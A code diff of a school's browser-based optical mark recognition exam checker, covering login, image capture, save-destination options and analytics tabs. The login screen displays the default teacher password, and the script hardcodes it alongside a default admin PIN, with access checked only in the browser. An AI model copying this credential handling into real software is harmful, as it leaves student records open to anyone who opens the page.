-        <path d="M32 5L55 13.5V31C55 45.8 45.2 55.6 32 59.5C18.8 55.6 9 45.8 9 31V13.5L32 5Z" fill="url(#shieldGradHeader)" stroke="#facc15" stroke-width="2.5"/>
-        <rect x="20.5" y="17.5" width="23" height="28" rx="3" fill="#ffffff"/>
-        <circle cx="25.5" cy="23.5" r="2.2" fill="#16a34a"/>
-        <rect x="30" y="22" width="9.5" height="3" rx="1.5" fill="#1e3a8a"/>
-        <circle cx="25.5" cy="30.5" r="2.2" fill="#cbd5e1"/>
-        <circle cx="32" cy="30.5" r="2.2" fill="#16a34a"/>
-        <circle cx="38.5" cy="30.5" r="2.2" fill="#cbd5e1"/>
-        <circle cx="25.5" cy="37.5" r="2.2" fill="#16a34a"/>
-        <rect x="30" y="36" width="9.5" height="3" rx="1.5" fill="#1e3a8a"/>
-        <line x1="15" y1="30.5" x2="49" y2="30.5" stroke="#ef4444" stroke-width="2" stroke-linecap="round"/>
+        <path d="M60 6 L106 24 V60 C106 88 86 106 60 115 C34 106 14 88 14 60 V24 L60 6 Z"
+              fill="url(#shieldGradLock)" stroke="url(#goldRimLock)" stroke-width="4.5"/>
+        <path d="M31 35 V28 H38 M89 35 V28 H82 M31 81 V88 H38 M89 81 V88 H82"
+              fill="none" stroke="#38bdf8" stroke-width="3" stroke-linecap="round"/>
+        <rect x="37" y="32" width="46" height="52" rx="6" fill="#ffffff" opacity="0.96"/>
+        <circle cx="48" cy="44" r="4" fill="#1e3a8a"/>
+        <circle cx="60" cy="44" r="4" fill="none" stroke="#94a3b8" stroke-width="1.8"/>
+        <circle cx="72" cy="44" r="4" fill="none" stroke="#94a3b8" stroke-width="1.8"/>
+        <circle cx="48" cy="57" r="4" fill="none" stroke="#94a3b8" stroke-width="1.8"/>
+        <circle cx="60" cy="57" r="4" fill="none" stroke="#94a3b8" stroke-width="1.8"/>
+        <circle cx="72" cy="57" r="4" fill="#1e3a8a"/>
+        <circle cx="48" cy="70" r="4" fill="none" stroke="#94a3b8" stroke-width="1.8"/>
+        <circle cx="60" cy="70" r="4" fill="#16a34a"/>
+        <circle cx="72" cy="70" r="4" fill="none" stroke="#94a3b8" stroke-width="1.8"/>
+        <rect x="27" y="55.5" width="66" height="3" rx="1.5" fill="url(#laserGlowLock)"/>
+        <circle cx="84" cy="82" r="15" fill="#16a34a" stroke="#ffffff" stroke-width="2.5"/>
+        <path d="M77.5 82 L82 86.5 L91 77.5" fill="none" stroke="#ffffff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/>
       </svg>
-      <div>
-        <h1>CPGHS — OMR SCANNER</h1>
-        <p>Carlos P. Garcia High School • Cubao, Q.C.</p>
-      </div>
     </div>
-
-    <button type="button" id="headerInstallBtn" class="header-install-btn" onclick="triggerPwaInstall()">
-      📲 Install CPGHS OMR
-    </button>
+    <h2>CPGHS Optical Mark Recognition (OMR) Exam Checker</h2>
+    <p>Enter the shared CPGHS Teacher Password to access the OMR Image Capture &amp; Item Analytics System.</p>
+    <input type="password" id="pinUnlockInput" class="pin-input" placeholder="Password" onkeydown="if(event.key==='Enter') verifySharedUserPassword()" />
+    <div id="pinErrorMsg" class="pin-error"></div>
+    <button type="button" class="btn-primary" onclick="verifySharedUserPassword()">🔓 Unlock Exam Checker</button>
+    <div style="font-size:11px; color:#64748b; margin-top:10px;">Default Teacher Password: <code>CPGHS2026</code></div>
   </div>
-
-  <div class="header-badges">
-    <span id="cvStatus" class="badge-status">Loading Vision Engine...</span>
-    <span id="scannedCountBadge" class="badge-status queue">Scanned: 0</span>
-    <span id="unsyncedCountBadge" class="badge-status unsynced" style="display:none;">Pending Sync: 0</span>
-  </div>
-</header>
-
-<!-- Guided 3-Step Workflow Strip -->
-<div class="workflow-strip">
-  <span id="wfStep1" class="wf-step active" onclick="switchTab('tos')">1. Prefill TOS / Keys</span>
-  <span>➔</span>
-  <span id="wfStep2" class="wf-step" onclick="switchTab('scanner')">2. Capture &amp; Auto-Save</span>
-  <span>➔</span>
-  <span id="wfStep3" class="wf-step" onclick="switchTab('analytics')">3. History &amp; CSV</span>
 </div>
 
 <!-- ==========================================================================
-     TAB 1 (DEFAULT AFTER LOGIN): TEACHER TOS, KEYS & STUDENT MASTERLIST
+     CENTER NOTIFICATION MODAL
+     ========================================================================== -->
+<div id="centerModalBackdrop" class="center-modal-backdrop" onclick="if(event.target===this) closeCenterModal()">
+  <div id="centerModalBox" class="center-modal-box">
+    <div id="centerModalIcon" class="center-modal-icon">ℹ️</div>
+    <div id="centerModalTitle" class="center-modal-title">Notice</div>
+    <div id="centerModalMsg" class="center-modal-msg"></div>
+    <button type="button" class="btn-primary" onclick="closeCenterModal()">OK</button>
+  </div>
+</div>
+
+<!-- ==========================================================================
+     DUPLICATE IMAGE CAUTION MODAL (OVERWRITE OR SELECT ANOTHER IMAGE)
+     ========================================================================== -->
+<div id="duplicateCautionModal" class="center-modal-backdrop">
+  <div class="center-modal-box warning">
+    <div class="center-modal-icon">⚠️</div>
+    <div class="center-modal-title" style="color:#92400e;">Caution: Duplicate Image Detected</div>
+    <div id="duplicateCautionDesc" class="center-modal-msg">
+      This answer sheet image has already been captured or saved. Overwriting will replace the existing record and image.
+    </div>
+    <div class="grid-2">
+      <button type="button" class="btn-amber" onclick="handleDuplicateOverwrite()">
+        ♻️ Overwrite Existing
+      </button>
+      <div class="native-capture-box btn-primary">
+        📸 Select Another Image
+        <input type="file" class="native-file-overlay" accept="image/*" onclick="dismissDuplicateAndPrepareNext()" onchange="handlePhotoUpload(event)" />
+      </div>
+    </div>
+    <button type="button" class="btn-outline btn-sm" style="margin-top:8px;" onclick="cancelDuplicateModalKeepView()">
+      Cancel &amp; Review Current Sheet
+    </button>
+  </div>
+</div>
+
+<!-- ==========================================================================
+     HEADER WITH CUSTOM BESPOKE LOGO & ANDROID / IOS PWA INSTALL BUTTON
+     ========================================================================== -->
+<header>
+  <div class="brand-wrap">
+    <svg class="brand-logo-svg" width="42" height="42" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+      <defs>
+        <linearGradient id="shieldGradHdr" x1="0%" y1="0%" x2="100%" y2="100%">
+          <stop offset="0%" stop-color="#0f172a"/>
+          <stop offset="55%" stop-color="#1e3a8a"/>
+          <stop offset="100%" stop-color="#3b82f6"/>
+        </linearGradient>
+        <linearGradient id="goldRimHdr" x1="0%" y1="0%" x2="100%" y2="100%">
+          <stop offset="0%" stop-color="#fde047"/>
+          <stop offset="50%" stop-color="#f59e0b"/>
+          <stop offset="100%" stop-color="#d97706"/>
+        </linearGradient>
+      </defs>
+      <path d="M60 6 L106 24 V60 C106 88 86 106 60 115 C34 106 14 88 14 60 V24 L60 6 Z"
+            fill="url(#shieldGradHdr)" stroke="url(#goldRimHdr)" stroke-width="5"/>
+      <path d="M31 35 V28 H38 M89 35 V28 H82 M31 81 V88 H38 M89 81 V88 H82"
+            fill="none" stroke="#38bdf8" stroke-width="3.5" stroke-linecap="round"/>
+      <rect x="37" y="32" width="46" height="52" rx="6" fill="#ffffff"/>
+      <circle cx="48" cy="44" r="4.2" fill="#1e3a8a"/>
+      <circle cx="60" cy="44" r="4.2" fill="none" stroke="#94a3b8" stroke-width="2"/>
+      <circle cx="72" cy="44" r="4.2" fill="none" stroke="#94a3b8" stroke-width="2"/>
+      <circle cx="48" cy="57" r="4.2" fill="none" stroke="#94a3b8" stroke-width="2"/>
+      <circle cx="60" cy="57" r="4.2" fill="none" stroke="#94a3b8" stroke-width="2"/>
+      <circle cx="72" cy="57" r="4.2" fill="#1e3a8a"/>
+      <circle cx="48" cy="70" r="4.2" fill="none" stroke="#94a3b8" stroke-width="2"/>
+      <circle cx="60" cy="70" r="4.2" fill="#16a34a"/>
+      <circle cx="72" cy="70" r="4.2" fill="none" stroke="#94a3b8" stroke-width="2"/>
+      <rect x="26" y="55.5" width="68" height="3.2" rx="1.6" fill="#38bdf8"/>
+      <circle cx="84" cy="82" r="16" fill="#16a34a" stroke="#ffffff" stroke-width="3"/>
+      <path d="M77 82 L82 87 L91.5 77.5" fill="none" stroke="#ffffff" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+    <div>
+      <h1>CPGHS Optical Mark Recognition (OMR) Exam Checker</h1>
+      <span class="sub">Photo Capture OMR • Smart Folder &amp; Gallery Export</span>
+    </div>
+  </div>
+  <div class="header-actions">
+    <span id="cvStatusBadge" class="badge">⏳ Vision</span>
+    <button type="button" id="pwaInstallHeaderBtn" class="install-btn" onclick="triggerPwaInstall()">📲 Install App</button>
+  </div>
+</header>
+
+<!-- Guided 3-Step Workflow Bar -->
+<div class="workflow-bar">
+  <div id="wfStep1" class="wf-step active" onclick="switchTab('tos', document.getElementById('nav-tos'))">1️⃣ Set Key &amp; TOS</div>
+  <div id="wfStep2" class="wf-step" onclick="switchTab('scanner', document.getElementById('nav-scanner'))">2️⃣ Image Capture</div>
+  <div id="wfStep3" class="wf-step" onclick="switchTab('analytics', document.getElementById('nav-analytics'))">3️⃣ Item Analytics</div>
+</div>
+
+<!-- ==========================================================================
+     TAB 1: ANSWER KEY & TABLE OF SPECIFICATIONS (TOS)
      ========================================================================== -->
 <section id="view-tos" class="view active">
   <div class="card">
-    <h2>Step 1A: Synced Student Masterlist (<span id="studentCountBadge">0</span> Students)</h2>
-    <p style="font-size:12px; color:#475569; margin-top:0;">
-      Synced from the <strong>Students</strong> tab in Google Sheets. Scanning a student's QR code auto-fills their LRN, Name, Section, and Gender.
-    </p>
-    <div class="grid-2">
-      <button class="btn-primary" onclick="syncKeysAndStudentsFromGoogle(true)">🔄 Sync Students &amp; Keys</button>
-      <a href="./answer-sheet.html" target="_blank" style="text-decoration:none;">
-        <button type="button" class="btn-outline">🖨️ Open Sheet Printer</button>
-      </a>
-    </div>
-  </div>
+    <h2>1. Configure Exam ID, Answer Key &amp; Competencies (TOS)</h2>
 
-  <div class="card">
-    <h2>Step 1B: Prefill Table of Specification (TOS) &amp; Answer Key</h2>
-    <label for="tosExamId">Exam ID</label>
+    <label for="tosExamId">Active Exam ID</label>
     <select id="tosExamId" onchange="syncTosFromExamId()">
       <option value="">-- Select Exam ID --</option>
     </select>
@@ -620,7 +521,7 @@
     <div style="margin-top: 8px; margin-bottom: 12px;">
       <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
         <label style="margin:0;">Learning Competencies &amp; Item Numbers (TOS)</label>
-        <button type="button" class="btn-primary btn-sm" onclick="addTosCompetencyRow()">+ Add Competency</button>
+        <button type="button" class="btn-primary btn-sm" style="width:auto;" onclick="addTosCompetencyRow()">+ Add Competency</button>
       </div>
       <div id="tosCompetencyList"></div>
       <div style="font-size:11px; color:#64748b;">
@@ -629,90 +530,99 @@
     </div>
 
     <div class="grid-2">
-      <button id="saveTosBtn" class="btn-success" onclick="saveKeyAndTosToSheet()">💾 Save Key &amp; TOS</button>
-      <button type="button" class="btn-primary" onclick="proceedFromTosToScanner()">Next: Go to Scanner ➡️</button>
+      <button type="button" id="saveTosBtn" class="btn-success" onclick="saveKeyAndTosToSheet()">💾 Save Key &amp; TOS</button>
+      <button type="button" class="btn-primary" onclick="proceedFromTosToScanner()">Next: Go to Image Capture ➡️</button>
     </div>
   </div>
 </section>
 
 <!-- ==========================================================================
-     TAB 2: CAMERA PHOTO CAPTURE OMR & AUTO-SAVE TO GALLERY
+     TAB 2: IMAGE CAPTURE OMR EXAM CHECKER (LIVE SCANNER REMOVED)
      ========================================================================== -->
 <section id="view-scanner" class="view">
   <div class="card">
-    <h2>1. Select Saved Exam Key &amp; Sheet Format</h2>
+    <h2>1. Active Exam Key &amp; Sheet Format</h2>
     <div class="grid-2">
       <div>
-        <label>Saved Exam Key</label>
+        <label for="examSelect">Saved Exam Key</label>
         <select id="examSelect" onchange="onExamSelected()">
           <option value="">-- Select Exam ID --</option>
         </select>
       </div>
       <div>
-        <label>Sheet Format</label>
-        <select id="sectionMode">
+        <label for="sectionMode">Sheet Format</label>
+        <select id="sectionMode" onchange="if(hasLoadedCaptureImage) reanalyzeCapturedImage()">
           <option value="ST1">Quarter-A4: ST 1 (1–25)</option>
           <option value="ST2">Quarter-A4: ST 2 (1–25)</option>
           <option value="TERM">Half-A4: Term Exam (1–50)</option>
         </select>
       </div>
     </div>
-    <input type="hidden" id="studentLrn" value="" />
-    <input type="hidden" id="studentName" value="" />
-    <input type="hidden" id="studentSection" value="" />
-    <input type="hidden" id="studentGender" value="N/A" />
+
+    <!-- Optional Student Override Fields -->
+    <details style="margin-top:4px; font-size:12px;">
+      <summary style="cursor:pointer; font-weight:700; color:var(--primary);">👤 Optional Student Info Override (Auto-filled if QR detected)</summary>
+      <div class="grid-3" style="margin-top:8px;">
+        <div>
+          <label for="studentLrn">Student LRN</label>
+          <input type="text" id="studentLrn" placeholder="12-digit LRN" />
+        </div>
+        <div>
+          <label for="studentName">Student Name</label>
+          <input type="text" id="studentName" placeholder="DELA CRUZ, JUAN" />
+        </div>
+        <div>
+          <label for="studentSection">Section</label>
+          <input type="text" id="studentSection" placeholder="Grade 8 - Rizal" />
+        </div>
+      </div>
+      <input type="hidden" id="studentGender" value="N/A" />
+    </details>
   </div>
 
   <div class="card">
-    <h2>2. Capture Answer Sheet &amp; Auto-Save Checked Sheet to Gallery</h2>
+    <h2>2. Capture Answer Sheet Image</h2>
 
-    <div class="grid-2" style="margin-bottom:10px;">
-      <button type="button" id="captureCameraBtn" class="btn-primary" style="padding:14px; font-size:14px;" onclick="triggerCameraCapture()">
-        📸 Capture Photo (Camera)
-      </button>
-      <button type="button" id="chooseGalleryBtn" class="btn-outline" style="padding:14px; font-size:14px;" onclick="triggerGalleryUpload()">
-        🖼️ Upload Existing Photo
-      </button>
+    <!-- Image Capture Only Buttons (Camera Capture + Gallery Image Upload) -->
+    <div class="grid-2" style="margin-bottom:8px;">
+      <div class="native-capture-box btn-primary" style="padding:14px 10px; font-size:13.5px;">
+        📷 Capture Photo (Camera)
+        <input type="file" id="cameraCaptureInput" class="native-file-overlay" accept="image/*" capture="environment" onchange="handlePhotoUpload(event)" />
+      </div>
+
+      <div class="native-capture-box btn-outline" style="padding:14px 10px; font-size:13.5px;">
+        🖼️ Upload Image from Gallery
+        <input type="file" id="photoFileInput" class="native-file-overlay" accept="image/*" onchange="handlePhotoUpload(event)" />
+      </div>
     </div>
 
-    <!-- Direct Rear Camera Input -->
-    <input type="file" id="cameraCaptureInput" accept="image/*" capture="environment" style="display:none;" onchange="handlePhotoUpload(event)" />
-    <!-- Optional Gallery Fallback Input -->
-    <input type="file" id="photoFileInput" accept="image/*" style="display:none;" onchange="handlePhotoUpload(event)" />
-
-    <div id="photoStageWrapper" class="camera-wrapper" style="display:none;">
+    <!-- Photo Capture & Grading Stage -->
+    <div id="photoStageWrapper" class="camera-wrapper">
       <canvas id="cornerPinCanvas"></canvas>
       <canvas id="resultCanvas"></canvas>
-      <div id="scanHud" class="scan-hud">Processing answer sheet... please wait.</div>
+      <div id="scanHud" class="scan-hud">Ready for image capture.</div>
     </div>
 
     <!-- Post-Capture Corner Pin Adjustment & Re-Analyze Bar -->
     <div id="reviewControls" class="review-controls">
       <div id="reviewControlsTitle" class="review-controls-title">
-        Drag any corner dot onto the center of the 4 black squares if needed, then tap Re-Analyze
+        Drag any corner handle onto the 4 black corner squares if needed, then tap Re-Analyze
       </div>
       <div class="grid-3">
-        <button type="button" id="toggleViewBtn" class="btn-outline btn-sm" style="width:100%;" onclick="toggleCornerPinView()">🎯 Adjust 4 Corners</button>
-        <button type="button" id="reanalyzeBtn" class="btn-primary btn-sm" style="width:100%;" onclick="reanalyzeCapturedImage()">🔄 Re-Analyze</button>
-        <button type="button" class="btn-outline btn-sm" style="width:100%;" onclick="triggerCameraCapture()">📸 Retake</button>
+        <button type="button" id="toggleViewBtn" class="btn-outline btn-sm" onclick="toggleCornerPinView()">🎯 Adjust 4 Corners</button>
+        <button type="button" id="reanalyzeBtn" class="btn-primary btn-sm" onclick="reanalyzeCapturedImage()">🔄 Re-Analyze</button>
+        <div class="native-capture-box btn-outline btn-sm">
+          📸 Retake Image
+          <input type="file" class="native-file-overlay" accept="image/*" capture="environment" onchange="handlePhotoUpload(event)" />
+        </div>
       </div>
     </div>
 
-    <!-- Duplicate Scan Protection Banner -->
-    <div id="dupWarningBanner" class="dup-banner">
-      <div class="dup-title">⚠️ Duplicate Paper Detected!</div>
-      <div id="dupWarningDesc" class="dup-desc">This student already has a recorded score for this exam.</div>
-      <div class="grid-2">
-        <button class="btn-amber" onclick="confirmOverwriteDuplicate()">♻️ Overwrite Score</button>
-        <button class="btn-outline" onclick="skipDuplicatePaper()">⏭️ Skip &amp; Next Paper</button>
-      </div>
-    </div>
-
-    <!-- Graded Score Banner + Auto-Save to Gallery Before Next Capture -->
+    <!-- Graded Score Banner + Destination Chooser (Phone Gallery vs Destination Folder Path) -->
     <div id="scoreBanner" class="score-banner">
       <div id="detectedStudentBanner" class="detected-student-info">Student: Unidentified</div>
       <div id="rapidStatusPill" style="font-size:11px; font-weight:800; color:#15803d; margin-bottom:2px;">
-        ✅ GRADED &amp; READY TO SAVE TO GALLERY
+        ✅ GRADED &amp; READY TO SAVE
       </div>
       <div id="scoreDisplay" class="score-big">0 / 25 (0%)</div>
       <div id="scanQualityNote" style="font-size:11px; color:#475569; margin-top:4px;"></div>
@@ -723,17 +633,59 @@
         <span><span class="dot-key"></span>Correct Key</span>
       </div>
 
+      <!-- Post-Capture Destination Selector: Phone Gallery OR Custom Folder Path -->
+      <div class="save-dest-card">
+        <div class="save-dest-title">
+          <span>📂 Choose Where to Save Checked Image:</span>
+          <span id="pickedDirBadge" style="font-size:10.5px; color:#16a34a; font-weight:800;"></span>
+        </div>
+
+        <div class="dest-option-row">
+          <label id="pillDestGallery" class="dest-radio-pill selected" onclick="selectSaveDestination('gallery')">
+            <input type="radio" name="saveDestMode" id="radioDestGallery" value="gallery" checked />
+            <span>📱 Phone Gallery</span>
+          </label>
+
+          <label id="pillDestFolder" class="dest-radio-pill" onclick="selectSaveDestination('folder')">
+            <input type="radio" name="saveDestMode" id="radioDestFolder" value="folder" />
+            <span>📁 Destination Folder Path</span>
+          </label>
+        </div>
+
+        <!-- Custom Folder Path Input + Paste Path + Optional Direct Directory Picker -->
+        <div id="folderPathPanel" class="folder-path-panel">
+          <label for="destFolderPathInput" style="font-size:11px; color:#1e3a8a;">
+            Paste or Enter Destination Folder Path:
+          </label>
+          <div class="path-input-group">
+            <input type="text" id="destFolderPathInput" placeholder="e.g. /storage/emulated/0/Documents/CPGHS_OMR/" oninput="persistDestinationFolderPath(this.value)" />
+            <button type="button" class="btn-primary path-action-btn" onclick="pasteDestinationFolderPath()">
+              📋 Paste Path
+            </button>
+          </div>
+          <div style="display:flex; justify-content:space-between; align-items:center; gap:6px; flex-wrap:wrap;">
+            <span style="font-size:10.5px; color:#475569;">
+              Paste your folder path above, or pick a device folder directly:
+            </span>
+            <button type="button" class="btn-outline btn-sm" style="width:auto; padding:5px 9px; font-size:11px;" onclick="pickRealDeviceFolder()">
+              📂 Browse Folder
+            </button>
+          </div>
+        </div>
+      </div>
+
       <div id="driveUploadStatus" class="drive-status-pill">
-        📱 Graded image auto-saved to Phone Gallery &amp; recorded in Local Scan History.
+        Select your save destination above, then tap Save Checked Image.
       </div>
 
       <div class="grid-2" style="margin-top:10px;">
-        <button id="saveAndGalleryBtn" class="btn-success" onclick="saveResultAndDownloadToGallery()">
-          💾 Save &amp; Auto-Save to Gallery
+        <button type="button" id="saveAndGalleryBtn" class="btn-success" onclick="saveCheckedImageWithDuplicateGuard()">
+          💾 Save Checked Image
         </button>
-        <button type="button" class="btn-primary" onclick="saveAndProceedNextCapture()">
-          📸 Save &amp; Next Capture
-        </button>
+        <div class="native-capture-box btn-primary">
+          📸 Capture Next Image
+          <input type="file" class="native-file-overlay" accept="image/*" capture="environment" onchange="handlePhotoUpload(event)" />
+        </div>
       </div>
     </div>
   </div>
@@ -743,14 +695,14 @@
     <div class="history-header">
       <h2 style="border:none; margin:0; padding:0;">3. Local Scan History (<span id="historyExamLabel">All Exams</span>)</h2>
       <div class="history-actions">
-        <button class="btn-primary btn-sm" onclick="syncAllPendingScans()">☁️ Sync Pending (<span id="pendingBtnCount">0</span>)</button>
-        <button class="btn-success btn-sm" onclick="exportLocalHistoryCsv()">⬇️ Download CSV</button>
-        <button class="btn-outline btn-sm" onclick="switchTab('analytics')">📊 Analytics ➡️</button>
-        <button class="btn-danger btn-sm" onclick="clearLocalScanHistory()">🗑️ Clear</button>
+        <button type="button" class="btn-primary btn-sm" style="width:auto;" onclick="syncAllPendingScans()">☁️ Sync Pending (<span id="pendingBtnCount">0</span>)</button>
+        <button type="button" class="btn-success btn-sm" style="width:auto;" onclick="exportLocalHistoryCsv()">⬇️ Download CSV</button>
+        <button type="button" class="btn-outline btn-sm" style="width:auto;" onclick="switchTab('analytics', document.getElementById('nav-analytics'))">📊 Analytics ➡️</button>
+        <button type="button" class="btn-danger btn-sm" style="width:auto;" onclick="clearLocalScanHistory()">🗑️ Clear</button>
       </div>
     </div>
     <p style="font-size:11px; color:#475569; margin:0 0 8px 0;">
-      All captured sheets are saved here. Download the CSV directly or open Analytics for item analysis &amp; ranking CSV.
+      Duplicate images and duplicate student sheets are guarded automatically. Export CSV or sync to Google Sheets anytime.
     </p>
     <div style="overflow-x:auto; max-height:260px;">
       <table id="scanHistoryTable">
@@ -761,7 +713,7 @@
             <th>Student Name</th>
             <th>Exam</th>
             <th>Score</th>
-            <th>Sync</th>
+            <th>Saved To</th>
             <th>Action</th>
           </tr>
         </thead>
@@ -772,31 +724,31 @@
 </section>
 
 <!-- ==========================================================================
-     TAB 3: DATA ANALYTICS, ITEM ANALYSIS & CSV DOWNLOAD
+     TAB 3: DATA ANALYTICS, ITEM ANALYSIS & CSV REPORT EXPORT
      ========================================================================== -->
 <section id="view-analytics" class="view">
   <div class="card">
     <h2>Assessment Analytics &amp; CSV Report Export</h2>
     <div style="display:flex; gap:6px; flex-wrap:wrap; margin-bottom:10px;">
-      <button type="button" class="btn-primary btn-sm exam-type-pill" data-filter="ALL" onclick="filterAnalyticsExams('ALL', this)">All Exams</button>
-      <button type="button" class="btn-outline btn-sm exam-type-pill" data-filter="ST1" onclick="filterAnalyticsExams('ST1', this)">Summative Test 1 (1–25)</button>
-      <button type="button" class="btn-outline btn-sm exam-type-pill" data-filter="ST2" onclick="filterAnalyticsExams('ST2', this)">Summative Test 2 (1–25)</button>
-      <button type="button" class="btn-outline btn-sm exam-type-pill" data-filter="TERM" onclick="filterAnalyticsExams('TERM', this)">Term Exam (1–50)</button>
+      <button type="button" class="btn-primary btn-sm exam-type-pill" style="width:auto;" data-filter="ALL" onclick="filterAnalyticsExams('ALL', this)">All Exams</button>
+      <button type="button" class="btn-outline btn-sm exam-type-pill" style="width:auto;" data-filter="ST1" onclick="filterAnalyticsExams('ST1', this)">Summative Test 1 (1–25)</button>
+      <button type="button" class="btn-outline btn-sm exam-type-pill" style="width:auto;" data-filter="ST2" onclick="filterAnalyticsExams('ST2', this)">Summative Test 2 (1–25)</button>
+      <button type="button" class="btn-outline btn-sm exam-type-pill" style="width:auto;" data-filter="TERM" onclick="filterAnalyticsExams('TERM', this)">Term Exam (1–50)</button>
     </div>
 
     <div class="grid-2">
       <div>
-        <label>Select Exam ID (ST1, ST2, or Term Exam)</label>
+        <label for="analyticsExamSelect">Select Exam ID (ST1, ST2, or Term Exam)</label>
         <select id="analyticsExamSelect" onchange="loadAnalytics()"></select>
       </div>
       <div style="display:flex; align-items:flex-end; gap:6px;">
-        <button class="btn-primary" style="margin-bottom:10px;" onclick="loadAnalytics()">📊 Refresh</button>
-        <button class="btn-success" style="margin-bottom:10px;" onclick="exportItemAnalysisCsv()">⬇️ Download CSV</button>
+        <button type="button" class="btn-primary" style="margin-bottom:10px;" onclick="loadAnalytics()">📊 Refresh</button>
+        <button type="button" class="btn-success" style="margin-bottom:10px;" onclick="exportItemAnalysisCsv()">⬇️ Download CSV</button>
       </div>
     </div>
 
     <div id="activeExamMetaBanner" style="font-size:11.5px; font-weight:700; color:#1e3a8a; background:#eff6ff; padding:6px 10px; border-radius:6px; margin-bottom:10px;">
-      Active Report: Loading...
+      Active Report: Select an Exam ID above
     </div>
 
     <div class="kpi-grid">
@@ -850,7 +802,7 @@
   </div>
 
   <div class="card">
-    <h2>2. Top 10 Least Mastered Competencies (TOS)</h2>
+    <h2>2. Least Mastered Competencies (TOS)</h2>
     <canvas id="competencyChart" height="210"></canvas>
     <div style="overflow-x:auto; margin-top:10px;">
       <table id="tosTable">
@@ -896,9 +848,9 @@
   <div id="adminControlsContainer" style="display:none;">
     <div class="card">
       <h2>Google Apps Script Web App Connection</h2>
-      <label>Deployed Google Apps Script Web App URL</label>
+      <label for="gasUrlInput">Deployed Google Apps Script Web App URL</label>
       <input type="url" id="gasUrlInput" placeholder="https://script.google.com/macros/s/AKfycb.../exec" />
-      <button class="btn-primary" onclick="saveGasUrl()">🔗 Connect &amp; Sync Keys + Students</button>
+      <button type="button" class="btn-primary" onclick="saveGasUrl()">🔗 Connect &amp; Sync Keys + Students</button>
     </div>
 
     <div class="card">
@@ -908,13 +860,13 @@
         <strong>Admin / Developer PIN:</strong> SHA-256 encrypted PIN restricted to the developer/admin (Default: <code>999900</code>).
       </p>
 
-      <label>Set Global User Password (All Users)</label>
+      <label for="newSharedUserPassInput">Set Global User Password (All Users)</label>
       <div class="grid-2">
         <input type="text" id="newSharedUserPassInput" placeholder="New User Password (min 4 chars)" />
         <button type="button" class="btn-primary" style="margin-bottom:10px;" onclick="updateSharedUserPassword()">👥 Update User Password</button>
       </div>
 
-      <label>Update Encrypted Developer / Admin PIN</label>
+      <label for="newAdminPinInput">Update Encrypted Developer / Admin PIN</label>
       <div class="grid-2">
         <input type="password" id="newAdminPinInput" inputmode="numeric" maxlength="10" placeholder="New Admin PIN (4–10 digits)" />
         <input type="password" id="confirmAdminPinInput" inputmode="numeric" maxlength="10" placeholder="Confirm Admin PIN" />
@@ -927,37 +879,200 @@
   </div>
 </section>
 
-<!-- Reordered Bottom Navigation: 1. TOS/Keys -> 2. Scanner -> 3. Analytics -> 4. Setup -->
+<!-- Bottom Navigation -->
 <nav class="bottom-nav">
-  <button id="nav-tos" class="nav-btn active" onclick="switchTab('tos', this)"><span class="nav-icon">📋</span>1. TOS / Keys</button>
-  <button id="nav-scanner" class="nav-btn" onclick="switchTab('scanner', this)"><span class="nav-icon">📸</span>2. Scanner</button>
-  <button id="nav-analytics" class="nav-btn" onclick="switchTab('analytics', this)"><span class="nav-icon">📊</span>3. Analytics</button>
-  <button id="nav-settings" class="nav-btn" onclick="switchTab('settings', this)"><span class="nav-icon">⚙️</span>4. Setup</button>
+  <button type="button" id="nav-tos" class="nav-btn active" onclick="switchTab('tos', this)"><span class="nav-icon">📋</span>1. TOS / Keys</button>
+  <button type="button" id="nav-scanner" class="nav-btn" onclick="switchTab('scanner', this)"><span class="nav-icon">📸</span>2. Capture</button>
+  <button type="button" id="nav-analytics" class="nav-btn" onclick="switchTab('analytics', this)"><span class="nav-icon">📊</span>3. Analytics</button>
+  <button type="button" id="nav-settings" class="nav-btn" onclick="switchTab('settings', this)"><span class="nav-icon">⚙️</span>4. Setup</button>
 </nav>
 
 <script>
   // =========================================================================
-  // 1. SHARED PASSWORD LOGIN -> REDIRECT TO TAB 1 (TOS / KEYS)
+  // 1. STORAGE KEYS & APPLICATION STATE
   // =========================================================================
-  const KEY_USER_PASS_HASH  = 'cpghs_omr_shared_user_pass_sha256';
-  const KEY_ADMIN_PIN_HASH  = 'cpghs_omr_dev_admin_pin_sha256';
-  const DEFAULT_USER_PASS   = 'CPGHS2026';
-  const DEFAULT_ADMIN_PIN   = '999900';
+  const LS_USER_PASS_HASH  = 'cpghs_omr_shared_user_pass_sha256';
+  const LS_ADMIN_PIN_HASH  = 'cpghs_omr_dev_admin_pin_sha256';
+  const LS_EXAM_KEYS       = 'cpghs_omr_exam_keys';
+  const LS_SCAN_HISTORY    = 'cpghs_omr_scan_history';
+  const LS_SAVED_HASHES    = 'cpghs_omr_saved_image_hashes';
+  const LS_GAS_URL         = 'cpghs_omr_gas_url';
+  const LS_LAST_EXAM       = 'cpghs_last_selected_exam';
+  const LS_SAVE_DEST_MODE  = 'cpghs_omr_save_dest_mode';
+  const LS_DEST_FOLDER     = 'cpghs_omr_dest_folder_path';
+
+  const DEFAULT_USER_PASS  = 'CPGHS2026';
+  const DEFAULT_ADMIN_PIN  = '999900';
 
   let isAdminUnlocked = false;
-  let galleryAlreadySavedForCurrentSheet = false;
+  let cvReady = false;
+  let isCornerPinMode = false;
+  let draggingCornerIndex = -1;
+  let activeCorners = null;
+  let hasLoadedCaptureImage = false;
+  let currentImageFingerprint = '';
+  let sourceImageCanvas = document.createElement('canvas');
+  let lastGradedPayload = null;
+  let saveDestinationMode = localStorage.getItem(LS_SAVE_DEST_MODE) || 'gallery';
+  let pickedDirectoryHandle = null;
+  let analyticsTypeFilter = 'ALL';
+  let chartInstances = {};
 
+  function onOpenCvReady() {
+    cvReady = true;
+    const badge = document.getElementById('cvStatusBadge');
+    if (badge) {
+      badge.textContent = '✅ Vision';
+      badge.style.background = 'rgba(34, 197, 94, 0.35)';
+    }
+  }
+
+  // =========================================================================
+  // 2. ANDROID & IOS PWA MANIFEST, SERVICE WORKER & CUSTOM LOGO ICON GENERATOR
+  // =========================================================================
+  function getBespokeLogoSvgMarkup() {
+    return `<svg xmlns="http://www.w3.org/2000/svg" width="512" height="512" viewBox="0 0 120 120">
+      <defs>
+        <linearGradient id="bgG" x1="0%" y1="0%" x2="100%" y2="100%">
